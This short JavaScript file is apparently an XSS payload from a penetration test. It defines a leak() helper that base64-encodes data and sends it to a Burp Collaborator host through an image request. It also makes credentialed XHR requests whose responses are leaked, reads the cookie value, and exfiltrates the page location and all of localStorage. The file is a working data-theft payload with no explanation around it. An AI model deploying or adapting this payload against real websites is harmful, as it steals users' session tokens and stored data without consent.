leak = function(name, data)
{
   var i = document.createElement('img');
   i.src = "https://3676nv4yy7gt4c0979zitrv3zu5wtl.burpcollaborator.net/leak?" + name + "=" + btoa(data);
   document.body.appendChild(i); 
}

function reqListener () {
   try {
      data = unescape(encodeURIComponent(this.responseText));
      leak("response", data);
   }
   catch(e)
   {
      leak("exception", e.name + ":" + e.message);
   }
   
}

get = function(url)
{
 
   var XHR = new XMLHttpRequest();
   XHR.addEventListener('error', function( event ) {
      leak("get_error","Something went wrong");
   });
   XHR.addEventListener('load', reqListener);
   XHR.withCredentials = true;
   XHR.open('GET', url);
   XHR.send();
}

var csrf = document.cookie.split('=')[1];
leak("location",JSON.stringify(document.location));
leak("localstorage", JSON.stringify(localStorage));

